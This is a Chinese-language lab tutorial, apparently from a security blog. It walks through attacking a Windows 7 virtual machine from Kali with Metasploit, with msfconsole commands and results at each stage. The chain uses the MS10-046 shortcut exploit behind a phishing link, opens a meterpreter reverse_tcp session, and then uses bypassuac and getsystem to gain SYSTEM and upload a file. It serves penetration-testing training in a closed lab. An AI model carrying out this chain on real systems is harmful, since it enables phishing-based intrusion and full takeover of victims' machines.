> **本实验实现1**
> ：要生成一个钓鱼网址链接，诱导用户点击，实验过程是让win7去点击这个钓鱼网站链接，则会自动打开一个文件共享服务器的文件夹，在这个文件夹里面会有两个文件，当用户分别点击执行后，则会主动连接到发起攻击的主机上，即可攻击成功
>
>  **本实验实现2** ：攻击成功后，想要从kali上传文件到win7中，后发现权限不够的问题，则进行提权操作，后成功上传文件

在VMware上建立两个虚拟机：win7和kali

Kali：它是Linux发行版的操作系统，它拥有超过300个渗透测试工具，就不用自己再去找安装包，去安装到我们自己的电脑上了，毕竟自己从网上找到，也不安全。它甚至还集成了600多种黑客工具，很强大。

可以永久免费使用，基本上学黑客攻击必会用到这个系统

靶机：Win7 64位 （IP: 192.168.10.36）--用ipconfig进行查询

攻击机：Kali 64位 （IP：192.168.10.21）--用ifconfig进行查询

![1666605942_635663766e336cb7d1126.png!small?1666605946835](https://image.3001.net/images/20221024/1666605942_635663766e336cb7d1126.png!small?1666605946835)

![1666427714_6353ab427f2fdaf577553.png!small?1666427716413](https://image.3001.net/images/20221022/1666427714_6353ab427f2fdaf577553.png!small?1666427716413)

###  **1** **、实验环境前提条件：**

win7中，关闭防火墙（“打开网络和共享中心”-“Windows防火墙”-“打开或关闭Windows防火墙”-均选择关闭选项）

保证两个虚拟机是可以ping通的（尤其是在kali中去ping win7，看能否连通）

    
    
    >ping 192.168.10.36

![1666605992_635663a892ceebb78e1a4.png!small?1666605997173](https://image.3001.net/images/20221024/1666605992_635663a892ceebb78e1a4.png!small?1666605997173)

###  **2** **、打开** **Metasploit** **渗透工具**

Metasploit是一款开源的安全漏洞检测工具，msfconsole用于启动msf终端

    
    
    >msfconsole

结果：成功进入，进入到"msf6>“的模式下

![1666429441_6353b2012f683ace18655.png!small?1666429443563](https://image.3001.net/images/20221022/1666429441_6353b2012f683ace18655.png!small?1666429443563)

###  **3** **、查看需要利用的漏洞**

搜索漏洞，编号为ms10-046

【 **补充** ：Windows系统漏洞微软的漏洞编号命名格式为：MS10-046；

MS Micosoft的缩写，固定格式；  
10 表示年份，即2010年发布的漏洞；  
046 表示顺序，即当年度发布的第46个漏洞。

    
    
    >search ms10-046

结果：可以看到返回了多条可利用的漏洞模块信息

![1666491038_6354a29ebf19ec9a8b6d4.png!small?1666491041673](https://image.3001.net/images/20221023/1666491038_6354a29ebf19ec9a8b6d4.png!small?1666491041673)

### 4、尝试利用其中一个漏洞模块进行攻击

利用其中一个漏洞攻击模块-0模块，进行攻击，进入模块中（ **注意** ：必须是“_”，不是“-”，否则会报错）

    
    
    >use exploit/windows/browser/ms10_046_shortcut_icon_dllloader

结果：成功切换到这个模块之下--”msf6
exploit(windows/browser/ms10_046_shortcut_icon_dllloader)>“

并提示“no payload configured,defaulting to
windows/meterpreter/reverse_tcp”--没有配置payload，默认为
windows/meterpreter/reverse_tcp

![1666491190_6354a3362b1e055b0f57a.png!small?1666491193383](https://image.3001.net/images/20221023/1666491190_6354a3362b1e055b0f57a.png!small?1666491193383)

### 5、查看该漏洞模块所需的参数情况

进到这个漏洞模块之后，先查看该测试模块的参数情况。类似于你使用一软件，进行攻击，是不是需要先进行一些简单的参数配置啊，需要告诉软件，要向谁发起攻击吧，这是最最基本的，所以，要配置，就要先查看都可以配置哪些参数？

    
    
    >show options

结果：其中required显示的值为yes的，代表是必须要设置的项；显示的值为no的，代表是不必须要设置的项；

重点关注5个参数配置，需要设置哪个就设置哪个：

> Payload(攻击载体-使用默认的windows/meterpreter/reverse_tcp即可) ；
>
> SRVHOST(文件共享服务器-kali地址)；
>
> SRVPORT(文件共享服务器的端口-使用默认获取的端口即可)；
>
> LHOST(发起攻击的地址-kali地址)；
>
> LPORT(发起攻击的端口-使用默认获取的端口即可)

【 **补充说明：**

1）Payload中包含有需要在远程系统中运行的恶意代码，Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。也就是说，漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。

2）Payload模块主要有以下三种类型：-Single -Stager -Stage

> Single是一种完全独立的Payload，实现的目的也简单，但容易被捕捉到。
>
> Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。 一种常见的Stagers
> Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接（3次握手-4次挥手）（是一个基于TCP的反向链接反弹shell,
> 使用起来很稳定）。
>
> Stage是Stager Payload下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。

3）windows/x64/meterpreter/reverse_tcp则由一个Stager Payload（reverse_tcp）和一个Stage
Payload（meterpreter）组成。

 **【注意：** **Payload** **为** **windows/meterpreter/reverse_tcp** **默认获取到的控制通道**
**meterpreter** **为** **32** **位，**

 **如果想将之后获取到的控制通道** **meterpreter** **改为** **64** **位，则设置**
**payload:windows/x64/meterpreter/reverse_tcp** **】**

![1666491996_6354a65caf665bc870e36.png!small?1666491999599](https://image.3001.net/images/20221023/1666491996_6354a65caf665bc870e36.png!small?1666491999599)

###  **6、设置文件共享服务器**

发现仅SRVHOST为空待设置，其它（payload/SRVPORT/LHOST/LPORT）均已获取，且正确，设置SRVHOST的对应的参数地址，它指的是文件共享服务器的地址，想一想，要设成谁？为什么？

分析一下：是在哪里用到这个文件共享服务器？是不是会在生成一个钓鱼网址，诱导用户点击了，就会自动给它打开一个文件共享服务器文件夹啊，我们在这用。那你们觉得应该是谁生成这个文件夹呢？是用户那边么？还是攻击者这边？肯定是攻击者这边吧，我们是不知道会有谁点了这个钓鱼网站链接吧

所以，我们才会对这个文件共享服务器的地址设置为kali的地址

    
    
    >set SRVHOST 192.168.10.21

![1666492688_6354a9104969f555a407b.png!small?1666492691006](https://image.3001.net/images/20221023/1666492688_6354a9104969f555a407b.png!small?1666492691006)

###  **7、再次进行检查**

    
    
    >show options

![1666493420_6354abec20c6e652578c4.png!small?1666493422951](https://image.3001.net/images/20221023/1666493420_6354abec20c6e652578c4.png!small?1666493422951)

###  **8、检查无误后，发起攻击**

    
    
    >run

结果：生成一个钓鱼网站的链接“Using URL :
[http://192.168.10.21:80/](http://192.168.10.21/%E2%80%9D%EF%BC%8C%E5%BC%80)“，开启服务，等待有人点击该钓鱼网站链接

![1666601202_635650f215d6e2d2839cd.png!small?1666601206884](https://image.3001.net/images/20221024/1666601202_635650f215d6e2d2839cd.png!small?1666601206884)

### 9、打开钓鱼网站链接

到win7中，在IE浏览器中打开钓鱼网站链接：[http://192.168.10.21:80/](http://192.168.10.21/%E2%80%9D%EF%BC%8C%E5%BC%80)，会自动打开文件共享服务器文件夹，文件夹中会生成两个文件，尝试去双击打开“MISvnxTX”快捷方式的文件，即可触发会话连接

结果1：在win7中打开该快捷方式的文件后，不会有任何的反馈结果

![1666601479_635652074994d94f84b08.png!small?1666601484119](https://image.3001.net/images/20221024/1666601479_635652074994d94f84b08.png!small?1666601484119)

结果2：由于在win7中触发打开了快捷方式的文件，那么，在kali中，则会被触发会话连接，结果显示了是192.168.10.36尝试点击了钓鱼网站链接，并利用ms10-046漏洞模块对目标主机发起了攻击，最终，“meterpreter
session 1 opened”--表明已经开通192.168.10.21:4444和192.168.10.36:49195会话连接1

![1666601623_635652976558dfd5fbaa4.png!small?1666601628535](https://image.3001.net/images/20221024/1666601623_635652976558dfd5fbaa4.png!small?1666601628535)

###  **10** **、手动连接会话，进入控制通道**

一旦开通一个会话连接后，若系统没有自动进入控制通道，则进行手动连接

 **10.1）手动查看当前存在的会话**

注意在目录msf>下，手动查看当前存在的会话

结果：当前只有会话连接1，meterpreter建立的连接类型type是x84--32位的（由模块中的payload设定），以及展示目标主机192.168.10.36的基本信息和连接信息

    
    
    >sessions

![1666601962_635653ea118c443af15ab.png!small?1666601966734](https://image.3001.net/images/20221024/1666601962_635653ea118c443af15ab.png!small?1666601966734)

 **10.2）选择连接当前已经开通的会话1，并进入控制通道meterpreter，交互模式，表明攻击成功**

    
    
    >sessions -i 1

![1666602527_6356561f0ee3042795a93.png!small?1666602531520](https://image.3001.net/images/20221024/1666602527_6356561f0ee3042795a93.png!small?1666602531520)

![1666431012_6353b824e26e8420a240d.png!small?1666431014665](https://image.3001.net/images/20221022/1666431012_6353b824e26e8420a240d.png!small?1666431014665)

### 11、实现上传文件

在控制通道中，从kali主机中上传一个文件到win7中C盘根目录下（前提：在kali的主文件夹中新建1.txt，目录则是/home/kali/1.txt），使用的命令是upload

 **11.1）正常使用上传文件的命令upload**

    
    
    meterpreter>upload  /home/kali/1.txt  c:\

如果不能立马发聩结果的话，一般要手动回车两次，即可得到结果，但反馈结果提示错误信息：

“operation failed:access is denied”----操作失败: 访问被拒绝

![1666602826_6356574a3c7736ae32f3d.png!small?1666602830963](https://image.3001.net/images/20221024/1666602826_6356574a3c7736ae32f3d.png!small?1666602830963)

 **11.2）分析错误的原因**

1）先考虑是不是命令书写不对的啊，如果故意将命令书写不对，应该得到的提示是：“运行命令上传错误: 没有这样的文件或目录@rb _ file _ s _
stat-/home/kal/1. txror”

    
    
    meterpreter>upload  /home/ka/1.txt  c:\ 

结果：“NO such file or
directory.....”--没有这样的文件或目录，明显和“访问被拒绝”不一样，所以可以得到，上述错误不是书写不对的问题。

![1666602918_635657a69f80ac0df8a0c.png!small?1666602923197](https://image.3001.net/images/20221024/1666602918_635657a69f80ac0df8a0c.png!small?1666602923197)

2）那这就要考虑，访问被拒绝，是不是权限上的问题，一般来说，权限够的话，命令是不应该被拒绝，所以要考虑提权的问题。

【 **补充** ：

 **windows系统中用户权限** ：

> user【普通用户-张三】；
>
> administrator【管理员用户】；
>
> system【系统用户、虽不可登录，最高权限，但对系统有完整的控制权】；

 **Linux系统中用户权限** ：

> user【普通用户】；
>
> root【超级用户】；

 **11.3）提权**

用于提权，有个常用的命令：getsystem命令

    
    
    meterpreter>getsystem

结果：提示提权失败，“priv_elevate_getsystem: operation failed:this function is not
supported on this system. the following was attempted:” ----操作失败: 该系统不支持此函数

![1666607107_6356680384992ad1e7dab.png!small?1666607112119](https://image.3001.net/images/20221024/1666607107_6356680384992ad1e7dab.png!small?1666607112119)

 **11.4）为什么会提权失败呢？**

首先我们要知道Windows
vista系统（2005年微软开发的一款个人桌面操作系统，07年正式出售使用，12年终止它的主流技术支持，17年终止其的一切支持），是微软比较早的一个系统版本。它是在windowsXP和win7之间的一个过渡性系统，明显win7是晚于vista系统开发的

在晚于vista以后的系统中，增加了一个UAC的功能（user access control-用户账户控制），这个功能会对管理员组的用户起到一定的限制作用，目的是为了保护计算机的安全。也就是说，当我们需要运行一些重要的程序时，比如只有管理员权限才能运行的程序时，UAC功能就会弹出一个对话框，对用户进行询问，只有用户点击了同意按钮，程序才会以管理员或者system权限去运行。

因此，我们要想提权成功，首先要绕过windows的UAC限制，然后使用getsystem命令进行提权即可，接下来我们可以使用常用的绕过UAC的套路-bypassuac模块，进行绕过UAC限制

### 12、使用bypassuac模块绕过UAC限制

 **12.1** **）查看当前权限**

以上都是我们的分析，认为是权限的问题，那我们就来验证一下吧，看当前的权限到底是不是普通的权限啊，不是最高权限-system。进行当前权限的查看。

而且，即便没有以上这些问题的话，我们也要认清一个事实，就是：在获得了session后，说明建立了至少一个会话了，我们可以通过连接会话，来获取控制通道meterpreter，但注意，这并不意味着我们就可以为所欲为了，必然是会有一个权限的问题，一般不会一上来就能获得最高的权限，所以，会有两种情况：获得system最高权限，或者是普通用户权限

    
    
    meterpreter>getuid

结果：查看当前获得的用户的权限，只是普通用户权限”18044“，不是最高权限system

![1666604199_63565ca755d54731407ea.png!small?1666604203755](https://image.3001.net/images/20221024/1666604199_63565ca755d54731407ea.png!small?1666604203755)

 **12** **.2** **）挂起当前会话**

由于bypassuac模块是利用已有的会话连接，绕过UAC限制，最终会获得一个新的会话连接，所以它的前提是要成功开启一个会话连接，并保留下来，且不可以断开连接（exit），以供使用，所以，可以利用background进行返回，将攻击成功以后给我们返回的控制通道meterpreter
后台挂起，将当前的session会话1放入后台

    
    
    meterpreter>background

结果：成功将session会话1挂起到后台，并没有断开连接，且成功切换到msf >目录下

![1666604537_63565df928dea4701b112.png!small?1666604541705](https://image.3001.net/images/20221024/1666604537_63565df928dea4701b112.png!small?1666604541705)

 **12.3** **）使用bypassuac** **模块绕过UAC** **限制，查看需要利用的漏洞**

    
    
    >search bypassuac

结果：可以看到返回了多条可利用的漏洞模块信息

![1666604958_63565f9eab67827218db1.png!small?1666604964071](https://image.3001.net/images/20221024/1666604958_63565f9eab67827218db1.png!small?1666604964071)

 **12.4）尝试利用其中一个漏洞模块进行攻击**

利用其中一个漏洞攻击模块-02模块，进行攻击，进入模块中（ **注意** ：必须是“_”，不是“-”，否则会报错）

    
    
    >use exploit/windows/local/bypassuac

结果：成功切换到这个模块之下--”msf6 exploit(windows/local/bypassuac)>“

并提示“no payload configured,defaulting to
windows/meterpreter/reverse_tcp”--没有配置payload，默认为
windows/meterpreter/reverse_tcp

**![1666605079_63566017c3c9ee1b7afb4.png!small?1666605084239](https://image.3001.net/images/20221024/1666605079_63566017c3c9ee1b7afb4.png!small?1666605084239)**

 **12.5）查看该漏洞模块的参数情况**

进到这个漏洞模块之后，先查看该测试模块的参数情况

    
    
    >show options

结果展示：其中required显示的值为yes的，代表是必须要设置的项；显示的值为no的，代表是不必须要设置的项；

重点关注4个参数配置，需要设置哪个就设置哪个：

> Payload(攻击载体-使用默认的windows/meterpreter/reverse_tcp即可) ；
>
> SESSION(已开启的会话连接)；
>
> LHOST(发起攻击的地址-kali地址)；
>
> LPORT(发起攻击的端口-使用默认获取的端口即可)

![1666605221_635660a57ffeb35f10ffc.png!small?1666605226426](https://image.3001.net/images/20221024/1666605221_635660a57ffeb35f10ffc.png!small?1666605226426)

 **12.6）设置已开启的会话连接**

其它（payload/LHOST/LPORT）均已获取，且正确。

发现仅SESSION为空待设置，需要设置，提示“the session to run this module
on”-“运行此模块的会话”，我们肯定要设置一个已有的会话号吧，若是没有的会话，设置它也没法用，所以，参数SESSION指的是已开启的会话连接，应设置成我们已有的session连接会话1，被我们挂起放在后台了

    
    
    >set SESSION 1

![1666605624_63566238d81a372b1d412.png!small](https://image.3001.net/images/20221024/1666605624_63566238d81a372b1d412.png!small)

 **12.7）再次进行检查**

    
    
    >show options

![1666605707_6356628bbb55ea50c23bc.png!small?1666605712860](https://image.3001.net/images/20221024/1666605707_6356628bbb55ea50c23bc.png!small?1666605712860)

 **12.8）检查无误后，发起攻击**

    
    
    >run

结果显示：利用bypassuac漏洞模块对目标主机发起了攻击，成功绕过UAC限制，“meterpreter session 2
opened”--表明已经开通了192.168.10.21:4444和192.168.10.36:49199的新会话连接2

![1666606128_63566430e1eba1f3a7d02.png!small?1666606133605](https://image.3001.net/images/20221024/1666606128_63566430e1eba1f3a7d02.png!small?1666606133605)

###  **13** **、手动连接会话，进入控制通道**

一旦开通一个新的会话连接后，系统没有自动返回控制通道，进行手动连接

 **13.1）手动查看当前存在的会话**

注意在目录msf>下，结果显示：会话连接1和新生成的会话连接2，meterpreter建立的连接类型type是x84--32位的（由模块中的payload设定），以及展示目标主机192.168.10.36的基本信息和连接信息

    
    
    >sessions

![1666606428_6356655c66edeacb2e165.png!small?1666606433048](https://image.3001.net/images/20221024/1666606428_6356655c66edeacb2e165.png!small?1666606433048)

 **13.2）选择连接当前已经开通的新会话2，并进入控制通道meterpreter，交互模式，表明攻击成功**

【 **注意**
：就不要再连接会话1了，我们之前已经试过连接1，到控制通道，发现因权限不够，而提权失败。所以，要选择连接会话2，这是我们利用bypassuac模块绕过UAC功能，开启的新的会话连接，肯定要进到该会话中，才能实现成功提权的目的】

    
    
    >sessions -i 2

![1666606508_635665ac785d5c2ac59ef.png!small?1666606512907](https://image.3001.net/images/20221024/1666606508_635665ac785d5c2ac59ef.png!small?1666606512907)

![1666431012_6353b824e26e8420a240d.png!small?1666431014665](https://image.3001.net/images/20221022/1666431012_6353b824e26e8420a240d.png!small?1666431014665)

###  **14** **、查看当前权限，并进行提权**

 **14.1）进入控制通道后，先查看当前获得的用户的权限**

    
    
    meterpreter>getuid

结果：发现还只是普通用户权限，不是最高权限system

###
**![1666604199_63565ca755d54731407ea.png!small?1666604203755](https://image.3001.net/images/20221024/1666604199_63565ca755d54731407ea.png!small?1666604203755)**

 **14.2）再次提权**

理论上，我们是通过bypassuac模块获取的该权限，应已绕过了UAC限制，可以成功进行提权操作。用常用的提权命令：getsystem命令

    
    
    meterpreter>getsystem

结果：“got system” ---提示提权成功

![1666607783_63566aa7ccf1ac596301e.png!small?1666607788251](https://image.3001.net/images/20221024/1666607783_63566aa7ccf1ac596301e.png!small?1666607788251)

 **14.3）再次查看当前获得的权限**

    
    
    meterpreter>getuid

结果：获取了最高权限system

![1666607905_63566b21d60a7c8744144.png!small?1666607910289](https://image.3001.net/images/20221024/1666607905_63566b21d60a7c8744144.png!small?1666607910289)

###  **15、再次上传文件**

提权成功后，就可以用upload进行文件的上传，从kali传送到win7的C盘下

    
    
    meterpreter>upload  /home/kali/1.txt  c:\

结果1：成功将kali中的1.txt上传到win7的C盘根目录下

![1666608204_63566c4c5217ea67284e7.png!small?1666608208919](https://image.3001.net/images/20221024/1666608204_63566c4c5217ea67284e7.png!small?1666608208919)

结果2：在win7中c盘根目录下发现传过来的1.txt文档

![1666659531_635734cb615f064e32d10.png!small?1666659536480](https://image.3001.net/images/20221025/1666659531_635734cb615f064e32d10.png!small?1666659536480)

